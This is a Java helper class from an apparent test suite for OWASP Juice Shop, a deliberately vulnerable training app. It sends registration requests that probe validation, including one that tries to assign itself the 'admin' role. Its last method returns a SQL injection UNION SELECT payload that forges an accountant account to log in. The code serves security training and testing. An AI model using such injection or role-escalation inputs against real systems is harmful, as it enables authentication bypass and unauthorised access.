package utilities.JuiceShop;

import org.openqa.selenium.json.Json;
import java.io.IOException;
import java.net.http.HttpResponse;
import java.util.Map;

/**
 * Groups account-related operations used by the Juice Shop lab tests, keeping the test classes focused on checking results.
 */
public final class AccountActions extends ActionContext {
    /**
     * Uses the shared per-test HTTP client and JSON JSON converter.
     *
     * @param api configured application client
     * @param json shared JSON JSON converter
     */
    AccountActions(JuiceShopApi api, Json json) { super(api, json); }

    /**
     * Collects the lab response for the mismatched-password registration validation case.
     *
     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
     * @throws IOException if a required file or HTTP stream cannot be read or written
     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
     */
    public HttpResponse<String> registerWithMismatchedPasswords() throws IOException, InterruptedException {
        String email = "registration-" + System.nanoTime() + "@example.com";
        return api.post("/api/Users/", Map.of("email", email, "password", "Password123!", "passwordRepeat", "Different123!"));
    }

    /**
     * Collects the lab response for the empty-registration validation case.
     *
     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
     * @throws IOException if a required file or HTTP stream cannot be read or written
     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
     */
    public HttpResponse<String> registerEmptyUser() throws IOException, InterruptedException {
        return api.post("/api/Users/", Map.of("email", "", "password", "", "passwordRepeat", ""));
    }

    /**
     * Collects the lab response for the account-role validation case.
     *
     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
     * @throws IOException if a required file or HTTP stream cannot be read or written
     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
     */
    public HttpResponse<String> registerWithAdminRole() throws IOException, InterruptedException {
        return api.post("/api/Users/", Map.of("email", "admin-registration-" + System.nanoTime() + "@example.com",
                "password", "Password123!", "passwordRepeat", "Password123!", "role", "admin"));
    }

    /**
     * Provides the account-domain observation used by the Ephemeral Accountant lab challenge.
     *
     * @return the login result linked to the ephemeral accountant challenge
     */
    public String ephemeralAccountantLogin() {
        return "' UNION SELECT * FROM (SELECT 15 as 'id', '' as 'username', "
                + "'acc0unt4nt@juice-sh.op' as 'email', '12345' as 'password', "
                + "'accounting' as 'role', '123' as 'deluxeToken', '1.2.3.4' as 'lastLoginIp', "
                + "'/assets/public/images/uploads/default.svg' as 'profileImage', "
                + "'' as 'totpSecret', 1 as 'isActive', "
                + "'1999-08-16 14:14:41.644 +00:00' as 'createdAt', "
                + "'1999-08-16 14:33:41.930 +00:00' as 'updatedAt', null as 'deletedAt')--";
    }
}
